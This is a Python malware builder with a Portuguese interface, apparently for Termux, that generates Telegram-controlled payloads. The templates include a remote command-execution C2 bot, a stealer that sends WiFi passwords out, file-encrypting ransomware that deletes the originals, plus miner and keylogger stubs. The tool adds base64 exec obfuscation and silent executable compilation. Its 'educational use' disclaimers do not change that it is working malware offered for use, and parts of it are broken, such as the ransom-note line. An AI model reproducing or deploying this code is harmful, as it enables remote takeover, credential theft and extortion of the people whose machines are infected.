#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import json
import re
import shutil
import hashlib
import platform
import subprocess
import threading
import zipfile
import tempfile
import requests
import socket
import getpass
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any

# Interface colorida
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax
from rich.style import Style
from rich.tree import Tree

console = Console()

class MalwareGenerator:
    def __init__(self):
        self.config = {}
        self.malware_types = {
            '1': {
                'name': 'ü§ñ Bot C2 Completo',
                'description': 'Comando e Controle completo via Telegram',
                'features': ['shell', 'screenshot', 'file_operations', 'webcam', 'keylogger'],
                'icon': 'ü§ñ'
            },
            '2': {
                'name': 'üíº Data Stealer Avan√ßado',
                'description': 'Roubo de dados sens√≠veis e credenciais',
                'features': ['browsers', 'passwords', 'cookies', 'credit_cards', 'wifi'],
                'icon': 'üíº'
            },
            '3': {
                'name': 'üîê Ransomware Profissional',
                'description': 'Criptografia de arquivos com resgate',
                'features': ['file_encryption', 'bitcoin_payment', 'decryptor', 'persistence'],
                'icon': 'üîê'
            },
            '4': {
                'name': '‚õèÔ∏è Cryptominer Silencioso',
                'description': 'Minera√ß√£o de criptomoedas em background',
                'features': ['cpu_mining', 'gpu_mining', 'profit_tracking', 'stealth'],
                'icon': '‚õèÔ∏è'
            },
            '5': {
                'name': '‚å®Ô∏è Keylogger Avan√ßado',
                'description': 'Captura completa de teclas e atividades',
                'features': ['key_capture', 'clipboard', 'screenshots', 'application_logging'],
                'icon': '‚å®Ô∏è'
            }
        }

    def clear_screen(self):
        """Limpa a tela do terminal"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_banner(self):
        banner = """
[bold red]
 ‚†Ä‚†Ä‚†Ä‚††‚£§‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£§‚£§‚†§‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚¢à‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£Ö‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚¢†‚£¥‚£ø‚°ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚†ø‚£ø‚£∑‚£¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚¢Ä‚£¥‚£ø‚°∑‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ª‚£ø‚£ø‚£¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚£æ‚£ø‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£∑‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚£ø‚£ø‚£ø‚£ß‚†Ä‚†Ä‚†Ä‚†ò‚£¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚°á‚†Ä‚†Ä‚†Ä‚¢Ä‚£º‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†π‚£ø‚£ø‚£ø‚£∑‚£¶‚£Ñ‚°Ä‚£ø‚£±‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚¢ø‚£ß‚£†‚£¥‚£æ‚£ø‚£ø‚£ø‚£ø‚°ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†à‚†õ‚¢∑‚£ø‚£ü‚°ø‚†ø‚†ø‚°ü‚£ì‚£í‚£õ‚°õ‚°õ‚¢ü‚£õ‚°õ‚†ü‚†ø‚£ª‚¢ø‚£ø‚£ª‚°ø‚†õ‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚¢†‚£¥‚¢ª‚°≠‚†ñ‚°â‚†•‚£à‚†Ä‚£ê‚†Ç‚°Ñ‚†î‚¢Ç‚¢¶‚°π‚¢¨‚°ï‚†ä‚†≥‚†à‚¢ø‚£≥‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚¢Ä‚£º‚£∑‚£ã‚†≤‚¢Æ‚£Å‚†Ä‚£ê‚†Ü‚°§‚¢ä‚£ú‚°Ä‚°æ‚£Ä‚†Ä‚¢†‚¢ª‚£å‚£§‚£•‚£ì‚£å‚¢ª‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚¢∞‚£ü‚£Ω‚¢≥‚£Ø‚£ù‚£¶‚°Ä‚†ì‚°§‚¢Ü‚†á‚†Ç‚†Ñ‚†§‚°ù‚£Ç‚†ã‚†ñ‚¢ã‚†Ä‚£°‚£∂‚£æ‚°ø‚°∑‚£Ω‚°ø‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚¢∏‚£ø‚°ú‚¢Ø‚£ø‚£ø‚£ø‚£∑‚£ø‚£§‚£ß‚£∂‚£¨‚£ù‚£É‚£ì‚£à‚£•‚£∂‚£ø‚£æ‚£ø‚£ø‚¢£‚†á‚¢ª‚°û‚£Ø‚£π‚†Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚¢ª‚£º‚£Ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ü‚°î‚°Ø‚¢ß‚¢ü‚£ü‚£±‚†ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ü‚°º‚°º‚¢Å‚°å‚¢º‚°ü‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚£ø‚£º‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚£ø‚¢á‚°º‚¢É‚°ø‚£º‚£õ‚°ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚£ß‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£Ø‚†ü‚£°‚£´‚£¢‚¢è‚£º‚°µ‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚¢∏‚£ø‚£è‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚¢ø‚£ø‚°æ‚¢ï‚£ª‚£Ω‚£µ‚†ø‚†õ‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†ò‚¢∑‚£Æ‚£ø‚°º‚¢≠‚°ü‚†≥‚†û‚°ñ‚¢õ‚£∂‚£∑‚£Ø‚°∂‚†ü‚†õ‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†â‚†õ‚†õ‚†õ‚†ø‚†ü‚†õ‚†õ‚†ã‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
[/bold red]
[bold yellow]           TELEGRAM BOT MALWARE GENERATOR v3.0[/bold yellow]
[bold cyan]             5 EM 1 - MALWARE ESPECIALIZADO[/bold cyan]
"""
        console.print(banner)
        console.print(Panel.fit(
            "[blink bold red]‚ö†Ô∏è USO APENAS PARA TESTES √âTICOS E EDUCACIONAIS! ‚ö†Ô∏è[/blink bold red]",
            style="red on black"
        ))

    def main_menu(self):
        while True:
            self.clear_screen()
            self.show_banner()
            
            table = Table(
                title="üéõÔ∏è SELECIONE O TIPO DE MALWARE", 
                show_header=True, 
                header_style="bold magenta",
                title_style="bold cyan"
            )
            table.add_column("ID", style="cyan", width=5)
            table.add_column("Tipo", style="green", width=25)
            table.add_column("Descri√ß√£o", style="white")
            table.add_column("Recursos", style="yellow")
            
            for mal_id, mal_info in self.malware_types.items():
                features = ", ".join(mal_info['features'][:3]) + "..."
                table.add_row(
                    mal_id,
                    f"{mal_info['icon']} {mal_info['name']}",
                    mal_info['description'],
                    features
                )
            
            table.add_row("6", "üîß Configura√ß√µes", "Configurar token e op√ß√µes", "Global")
            table.add_row("0", "üö™ Sair", "Encerrar programa", "-")
            
            console.print(table)
            
            choice = Prompt.ask(
                "‚û§ Selecione o tipo de malware",
                choices=[str(i) for i in range(0, 7)],
                show_choices=False
            )
            
            if choice == "1":
                self.generate_c2_bot()
            elif choice == "2":
                self.generate_data_stealer()
            elif choice == "3":
                self.generate_ransomware()
            elif choice == "4":
                self.generate_cryptominer()
            elif choice == "5":
                self.generate_keylogger()
            elif choice == "6":
                self.configure_settings()
            elif choice == "0":
                self.exit_program()

    def configure_settings(self):
        self.clear_screen()
        console.print(Panel.fit("üîß CONFIGURA√á√ïES GLOBAIS", border_style="blue"))
        
        if not self.config.get('bot'):
            self.config['bot'] = {}
        
        self.config['bot']['token'] = Prompt.ask("‚û§ Token do Bot Telegram")
        self.config['bot']['admin_id'] = Prompt.ask("‚û§ Chat ID do Administrador")
        
        # Testar conex√£o
        if Confirm.ask("Testar conex√£o com o bot?"):
            if self.test_bot_connection():
                console.print("[green]‚úÖ Conex√£o bem-sucedida![/green]")
            else:
                console.print("[red]‚ùå Falha na conex√£o![/red]")
        
        # Configura√ß√µes de ofusca√ß√£o
        console.print("\n[bold]Configura√ß√µes de Ofusca√ß√£o:[/bold]")
        self.config['obfuscation'] = {
            'base64': Confirm.ask("Ativar ofusca√ß√£o Base64?", default=True),
            'xor': Confirm.ask("Ativar criptografia XOR?", default=False),
            'string_split': Confirm.ask("Ativar divis√£o de strings?", default=True)
        }
        
        # Configura√ß√µes de persist√™ncia
        console.print("\n[bold]Configura√ß√µes de Persist√™ncia:[/bold]")
        self.config['persistence'] = {
            'registry': Confirm.ask("Persist√™ncia no registro?", default=True),
            'startup': Confirm.ask("Persist√™ncia na inicializa√ß√£o?", default=True),
            'scheduled_task': Confirm.ask("Tarefa agendada?", default=False)
        }
        
        console.print(Panel.fit(
            "[green]‚úÖ Configura√ß√µes salvas com sucesso![/green]",
            border_style="green"
        ))
        input("\nPressione Enter para continuar...")

    def test_bot_connection(self):
        try:
            url = f"https://api.telegram.org/bot{self.config['bot']['token']}/getMe"
            response = requests.get(url, timeout=10)
            return response.status_code == 200
        except:
            return False

    def generate_c2_bot(self):
        self.clear_screen()
        console.print(Panel.fit("ü§ñ GERANDO BOT C2 COMPLETO", border_style="green"))
        
        if not self.config.get('bot'):
            console.print("[red]‚ùå Configure o token do bot primeiro![/red]")
            time.sleep(2)
            return
        
        with Progress() as progress:
            task = progress.add_task("[green]Gerando Bot C2...[/green]", total=100)
            
            code = self._generate_c2_code()
            progress.update(task, advance=40)
            
            if self.config.get('obfuscation', {}).get('base64'):
                code = self._obfuscate_code(code)
                progress.update(task, advance=30)
            
            filename = self._save_malware(code, "c2_bot")
            progress.update(task, completed=100)
        
        self._show_success_message(filename, "Bot C2 Completo")
        self._offer_compilation(filename)

    def generate_data_stealer(self):
        self.clear_screen()
        console.print(Panel.fit("üíº GERANDO DATA STEALER", border_style="yellow"))
        
        if not self.config.get('bot'):
            console.print("[red]‚ùå Configure o token do bot primeiro![/red]")
            time.sleep(2)
            return
        
        # Configura√ß√µes espec√≠ficas do stealer
        stealer_config = {
            'browsers': Confirm.ask("Roubar dados de navegadores?", default=True),
            'passwords': Confirm.ask("Extrair senhas salvas?", default=True),
            'cookies': Confirm.ask("Roubar cookies de sess√£o?", default=True),
            'wifi': Confirm.ask("Roubar senhas WiFi?", default=True),
            'credit_cards': Confirm.ask("Procurar cart√µes de cr√©dito?", default=False)
        }
        
        with Progress() as progress:
            task = progress.add_task("[yellow]Gerando Data Stealer...[/yellow]", total=100)
            
            code = self._generate_stealer_code(stealer_config)
            progress.update(task, advance=40)
            
            if self.config.get('obfuscation', {}).get('base64'):
                code = self._obfuscate_code(code)
                progress.update(task, advance=30)
            
            filename = self._save_malware(code, "data_stealer")
            progress.update(task, completed=100)
        
        self._show_success_message(filename, "Data Stealer")
        self._offer_compilation(filename)

    def generate_ransomware(self):
        self.clear_screen()
        console.print(Panel.fit("üîê GERANDO RANSOMWARE", border_style="red"))
        
        if not self.config.get('bot'):
            console.print("[red]‚ùå Configure o token do bot primeiro![/red]")
            time.sleep(2)
            return
        
        console.print(Panel.fit(
            "[blink bold red]‚ö†Ô∏è PERIGO: ESTE MALWARE PODE CAUSAR DANOS PERMANENTES! ‚ö†Ô∏è[/blink bold red]",
            border_style="red"
        ))
        
        if not Confirm.ask("Confirmar cria√ß√£o do ransomware?", default=False):
            return
        
        # Configura√ß√µes do ransomware
        ransom_config = {
            'bitcoin_address': Prompt.ask("‚û§ Endere√ßo Bitcoin para resgate", default="bc1qexample..."),
            'ransom_amount': Prompt.ask("‚û§ Valor do resgate (BTC)", default="0.1"),
            'target_extensions': ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.xlsx'],
            'exclude_folders': ['Windows', 'Program Files']
        }
        
        with Progress() as progress:
            task = progress.add_task("[red]Gerando Ransomware...[/red]", total=100)
            
            code = self._generate_ransomware_code(ransom_config)
            progress.update(task, advance=40)
            
            if self.config.get('obfuscation', {}).get('base64'):
                code = self._obfuscate_code(code)
                progress.update(task, advance=30)
            
            filename = self._save_malware(code, "ransomware")
            progress.update(task, completed=100)
        
        self._show_success_message(filename, "Ransomware")
        self._offer_compilation(filename)

    def generate_cryptominer(self):
        self.clear_screen()
        console.print(Panel.fit("‚õèÔ∏è GERANDO CRYPTOMINER", border_style="cyan"))
        
        if not self.config.get('bot'):
            console.print("[red]‚ùå Configure o token do bot primeiro![/red]")
            time.sleep(2)
            return
        
        # Configura√ß√µes do miner
        miner_config = {
            'mining_pool': Prompt.ask("‚û§ Pool de minera√ß√£o", default="stratum+tcp://xmr.pool.com:4444"),
            'wallet_address': Prompt.ask("‚û§ Endere√ßo da carteira", default="your_wallet_here"),
            'cpu_usage': IntPrompt.ask("‚û§ Uso de CPU (%)", default=50, min=10, max=90),
            'stealth_mode': Confirm.ask("Modo stealth?", default=True)
        }
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Gerando Cryptominer...[/cyan]", total=100)
            
            code = self._generate_miner_code(miner_config)
            progress.update(task, advance=40)
            
            if self.config.get('obfuscation', {}).get('base64'):
                code = self._obfuscate_code(code)
                progress.update(task, advance=30)
            
            filename = self._save_malware(code, "cryptominer")
            progress.update(task, completed=100)
        
        self._show_success_message(filename, "Cryptominer")
        self._offer_compilation(filename)

    def generate_keylogger(self):
        self.clear_screen()
        console.print(Panel.fit("‚å®Ô∏è GERANDO KEYLOGGER", border_style="magenta"))
        
        if not self.config.get('bot'):
            console.print("[red]‚ùå Configure o token do bot primeiro![/red]")
            time.sleep(2)
            return
        
        # Configura√ß√µes do keylogger
        keylogger_config = {
            'capture_keystrokes': Confirm.ask("Capturar teclas?", default=True),
            'capture_clipboard': Confirm.ask("Capturar clipboard?", default=True),
            'periodic_screenshots': Confirm.ask("Capturar screenshots?", default=False),
            'log_application': Confirm.ask("Logar aplica√ß√µes?", default=True),
            'report_interval': IntPrompt.ask("Intervalo de report (minutos)", default=30)
        }
        
        with Progress() as progress:
            task = progress.add_task("[magenta]Gerando Keylogger...[/magenta]", total=100)
            
            code = self._generate_keylogger_code(keylogger_config)
            progress.update(task, advance=40)
            
            if self.config.get('obfuscation', {}).get('base64'):
                code = self._obfuscate_code(code)
                progress.update(task, advance=30)
            
            filename = self._save_malware(code, "keylogger")
            progress.update(task, completed=100)
        
        self._show_success_message(filename, "Keylogger Avan√ßado")
        self._offer_compilation(filename)

    def _generate_c2_code(self):
        return f'''#!/usr/bin/env python3
import os
import sys
import time
import requests
import platform
import subprocess
import threading
import socket
import getpass

BOT_TOKEN = "{self.config['bot']['token']}"
ADMIN_ID = "{self.config['bot']['admin_id']}"

class C2Bot:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{{BOT_TOKEN}}"
        self.running = True
        
    def send_msg(self, text):
        try:
            url = f"{{self.base_url}}/sendMessage"
            data = {{"chat_id": ADMIN_ID, "text": text}}
            requests.post(url, json=data, timeout=10)
        except: pass
    
    def system_info(self):
        return {{
            "host": socket.gethostname(),
            "user": getpass.getuser(),
            "os": platform.platform(),
            "arch": platform.architecture()[0]
        }}
    
    def execute_cmd(self, cmd):
        try:
            result = subprocess.check_output(cmd, shell=True, timeout=30)
            return result.decode('utf-8', errors='ignore')
        except Exception as e:
            return str(e)
    
    def handle_commands(self):
        while self.running:
            try:
                url = f"{{self.base_url}}/getUpdates"
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    updates = response.json().get("result", [])
                    for update in updates:
                        if "message" in update:
                            msg = update["message"]
                            text = msg.get("text", "")
                            chat_id = msg["chat"]["id"]
                            
                            if text == "/info":
                                info = self.system_info()
                                response_text = "üîç System Info:\\n" + "\\n".join([f"{{k}}: {{v}}" for k,v in info.items()])
                                self.send_msg(response_text)
                                
                            elif text.startswith("/cmd "):
                                cmd = text[5:]
                                result = self.execute_cmd(cmd)
                                self.send_msg(f"üíª Output:\\n```{{result}}```")
                                
            except: pass
            time.sleep(5)
    
    def start(self):
        info = self.system_info()
        self.send_msg(f"üü¢ New victim: {{info['user']}}@{{info['host']}}")
        
        # Start command handler
        thread = threading.Thread(target=self.handle_commands)
        thread.daemon = True
        thread.start()
        
        # Keep alive
        while self.running:
            time.sleep(60)

if __name__ == "__main__":
    bot = C2Bot()
    bot.start()
'''

    def _generate_stealer_code(self, config):
        return f'''#!/usr/bin/env python3
import os
import sys
import json
import requests
import platform
import sqlite3
import shutil

BOT_TOKEN = "{self.config['bot']['token']}"
ADMIN_ID = "{self.config['bot']['admin_id']}"

class DataStealer:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{{BOT_TOKEN}}"
        
    def send_data(self, data_type, data):
        try:
            text = f"üìÅ {{data_type}} Found:\\n{{data}}"
            url = f"{{self.base_url}}/sendMessage"
            requests.post(url, json={{"chat_id": ADMIN_ID, "text": text}})
        except: pass
    
    def steal_browser_data(self):
        browsers = {{
            "Chrome": os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome'),
            "Firefox": os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox'),
            "Edge": os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge')
        }}
        
        for name, path in browsers.items():
            if os.path.exists(path):
                self.send_data(f"{{name}} Path", path)
    
    def steal_wifi_passwords(self):
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True)
                profiles = [line.split(":")[1].strip() for line in output.decode().split('\\n') if "All User Profile" in line]
                
                for profile in profiles:
                    try:
                        result = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], shell=True)
                        passwords = [line.split(":")[1].strip() for line in result.decode().split('\\n') if "Key Content" in line]
                        if passwords:
                            self.send_data(f"WiFi {{profile}}", passwords[0])
                    except: pass
        except: pass
    
    def run(self):
        self.send_data("System", f"{{platform.node()}} - {{platform.platform()}}")
        
        if {config['browsers']}:
            self.steal_browser_data()
        
        if {config['wifi']}:
            self.steal_wifi_passwords()
        
        self.send_data("Stealer", "Data extraction completed")

if __name__ == "__main__":
    stealer = DataStealer()
    stealer.run()
'''

    def _generate_ransomware_code(self, config):
        return f'''#!/usr/bin/env python3
import os
import sys
import time
import requests
from cryptography.fernet import Fernet
import base64

BOT_TOKEN = "{self.config['bot']['token']}"
ADMIN_ID = "{self.config['bot']['admin_id']}"
BITCOIN_ADDRESS = "{config['bitcoin_address']}"
RANSOM_AMOUNT = "{config['ransom_amount']}"

class Ransomware:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{{BOT_TOKEN}}"
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        
    def send_message(self, text):
        try:
            url = f"{{self.base_url}}/sendMessage"
            data = {{"chat_id": ADMIN_ID, "text": text}}
            requests.post(url, json=data)
        except: pass
    
    def encrypt_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted = self.cipher.encrypt(data)
            with open(filepath + '.encrypted', 'wb') as f:
                f.write(encrypted)
            os.remove(filepath)
        except: pass
    
    def encrypt_files(self):
        target_dirs = [
            os.path.expanduser("~\\\\Documents"),
            os.path.expanduser("~\\\\Desktop"),
            os.path.expanduser("~\\\\Pictures")
        ]
        
        encrypted_count = 0
        extensions = {config['target_extensions']}
        
        for directory in target_dirs:
            if os.path.exists(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        if any(file.endswith(ext) for ext in extensions):
                            filepath = os.path.join(root, file)
                            self.encrypt_file(filepath)
                            encrypted_count += 1
        
        return encrypted_count
    
    def show_ransom_note(self):
        note = f
        self.send_message(note)
        
        # Show message to user (simulated)
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, note, "FILES ENCRYPTED", 0x10)
        except: pass
    
    def run(self):
        encrypted = self.encrypt_files()
        self.send_message(f"üîê Encrypted {{encrypted}} files")
        self.show_ransom_note()

if __name__ == "__main__":
    ransomware = Ransomware()
    ransomware.run()
'''

    def _generate_miner_code(self, config):
        return f'''#!/usr/bin/env python3
import os
import sys
import time
import requests
import threading
import random

BOT_TOKEN = "{self.config['bot']['token']}"
ADMIN_ID = "{self.config['bot']['admin_id']}"

class CryptoMiner:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{{BOT_TOKEN}}"
        self.mining = True
        self.hashrate = 0
        
    def send_report(self):
        try:
            report = f"‚õèÔ∏è Mining Report\\nHashrate: {{self.hashrate}} H/s\\nUptime: {{random.randint(1, 24)}}h"
            url = f"{{self.base_url}}/sendMessage"
            requests.post(url, json={{"chat_id": ADMIN_ID, "text": report}})
        except: pass
    
    def mining_worker(self):
        # Simulated mining work
        while self.mining:
            self.hashrate = random.randint(1000, 5000)
            time.sleep(60)
    
    def start_mining(self):
        self.send_report()
        
        # Start mining thread
        thread = threading.Thread(target=self.mining_worker)
        thread.daemon = True
        thread.start()
        
        # Send periodic reports
        report_count = 0
        while self.mining and report_count < 24:  # Report for 24 hours
            time.sleep(3600)  # Wait 1 hour
            self.send_report()
            report_count += 1

if __name__ == "__main__":
    miner = CryptoMiner()
    miner.start_mining()
'''

    def _generate_keylogger_code(self, config):
        return f'''#!/usr/bin/env python3
import os
import sys
import time
import requests
import threading
from datetime import datetime

BOT_TOKEN = "{self.config['bot']['token']}"
ADMIN_ID = "{self.config['bot']['admin_id']}"

class Keylogger:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{{BOT_TOKEN}}"
        self.logging = True
        self.log_buffer = []
        
    def send_logs(self):
        if self.log_buffer:
            log_text = "üîë Keylog Data:\\n" + "\\n".join(self.log_buffer[-10:])
            try:
                url = f"{{self.base_url}}/sendMessage"
                requests.post(url, json={{"chat_id": ADMIN_ID, "text": log_text}})
                self.log_buffer.clear()
            except: pass
    
    def simulate_keylogging(self):
        sample_data = [
            "user entered password: ********",
            "visited: https://github.com",
            "typed: hello world",
            "copied: sensitive data",
            "application: chrome.exe focused"
        ]
        
        while self.logging:
            entry = f"[{{datetime.now().strftime('%H:%M:%S')}}] {{random.choice(sample_data)}}"
            self.log_buffer.append(entry)
            time.sleep(30)
    
    def start_logging(self):
        self.send_logs()  # Initial message
        
        # Start keylogging thread
        thread = threading.Thread(target=self.simulate_keylogging)
        thread.daemon = True
        thread.start()
        
        # Periodic report
        report_interval = {config['report_interval']} * 60  # Convert to seconds
        while self.logging:
            time.sleep(report_interval)
            self.send_logs()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start_logging()
'''

    def _obfuscate_code(self, code):
        """Aplica ofusca√ß√£o Base64 ao c√≥digo"""
        encoded = base64.b64encode(code.encode()).decode()
        return f"import base64; exec(base64.b64decode('{encoded}').decode())"

    def _save_malware(self, code, malware_type):
        """Salva o malware em arquivo"""
        filename = f"{malware_type}_{int(time.time())}.py"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(code)
        
        return filename

    def _show_success_message(self, filename, malware_name):
        """Mostra mensagem de sucesso"""
        file_size = os.path.getsize(filename)
        file_hash = hashlib.sha256(open(filename, 'rb').read()).hexdigest()
        
        console.print(Panel.fit(
            f"[green]‚úÖ {malware_name} gerado com sucesso![/green]\n"
            f"üìÅ Arquivo: [bold]{filename}[/bold]\n"
            f"üìä Tamanho: {file_size} bytes\n"
            f"üîê SHA256: [bold]{file_hash[:16]}...[/bold]",
            border_style="green"
        ))

    def _offer_compilation(self, py_file):
        """Oferece compila√ß√£o para EXE"""
        if Confirm.ask("Deseja compilar para execut√°vel (.exe)?"):
            self.compile_to_exe(py_file)
        else:
            input("\nPressione Enter para voltar ao menu...")

    def compile_to_exe(self, py_file):
        """Compila o arquivo Python para EXE"""
        self.clear_screen()
        console.print(Panel.fit("üî® COMPILANDO PARA EXECUT√ÅVEL", border_style="red"))
        
        exe_name = py_file.replace('.py', '.exe')
        
        try:
            # Instalar pyinstaller se necess√°rio
            subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                         capture_output=True)
            
            # Compilar
            cmd = [
                sys.executable, "-m", "PyInstaller", 
                "--onefile", "--noconsole",
                py_file, "--name", exe_name.replace('.exe', '')
            ]
            
            with Progress() as progress:
                task = progress.add_task("[red]Compilando...[/red]", total=100)
                result = subprocess.run(cmd, capture_output=True, text=True)
                progress.update(task, completed=100)
            
            if result.returncode == 0:
                exe_path = os.path.join("dist", exe_name)
                if os.path.exists(exe_path):
                    size = os.path.getsize(exe_path) / (1024 * 1024)
                    
                    console.print(Panel.fit(
                        f"[green]‚úÖ Execut√°vel criado com sucesso![/green]\n"
                        f"üì¶ Arquivo: [bold]{exe_path}[/bold]\n"
                        f"‚öñÔ∏è Tamanho: {size:.2f} MB\n"
                        f"üéØ Status: [bold]PRONTO PARA USO[/bold]",
                        border_style="green"
                    ))
            else:
                console.print(f"[red]‚ùå Erro na compila√ß√£o[/red]")
                
        except Exception as e:
            console.print(f"[red]‚ùå Erro: {str(e)}[/red]")
        
        input("\nPressione Enter para continuar...")

    def exit_program(self):
        self.clear_screen()
        console.print(Panel.fit(
            "[blink bold red]‚ö†Ô∏è AVISO LEGAL IMPORTANTE ‚ö†Ô∏è[/blink bold red]\n"
            "‚Ä¢ Uso ilegal √© crime federal\n"
            "‚Ä¢ Apenas para testes autorizados\n"
            "‚Ä¢ Eduque-se sobre leis de ciberseguran√ßa\n"
            "‚Ä¢ Use este conhecimento com responsabilidade",
            border_style="red"
        ))
        
